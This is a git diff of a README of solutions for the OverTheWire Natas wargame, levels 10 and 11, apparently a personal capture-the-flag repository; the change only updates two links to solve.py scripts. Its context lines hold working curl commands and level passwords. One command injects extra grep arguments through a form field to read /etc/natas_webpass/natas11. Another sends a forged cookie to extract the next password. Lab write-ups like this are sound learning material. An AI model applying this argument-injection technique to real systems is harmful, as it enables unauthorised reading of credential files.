@@ -153,7 +153,7 @@
     - ```curl -X POST -sv http://natas10.natas.labs.overthewire.org/ --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas11 \\" -F submit=submit | grep -o '\/etc.*' | awk -F: '{print $2}'```
 
 - python:
-    - [natas10/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas10/solve.py)
+    - [natas10/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_10/solve.py)
 
 - natas_11
     - ```Login to web:```
@@ -168,4 +168,4 @@
         -```curl -X POST -sv http://natas11.natas.labs.overthewire.org/ --user natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --cookie 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK' -F value='#ffffff' -F submit=submit | grep -oe '[a-zA-Z0-9]\{32\}'.*\<br\> | tr -d '<br>'```
 
 - python:
-    - [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas11/solve.py)
+    - [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_11/solve.py)
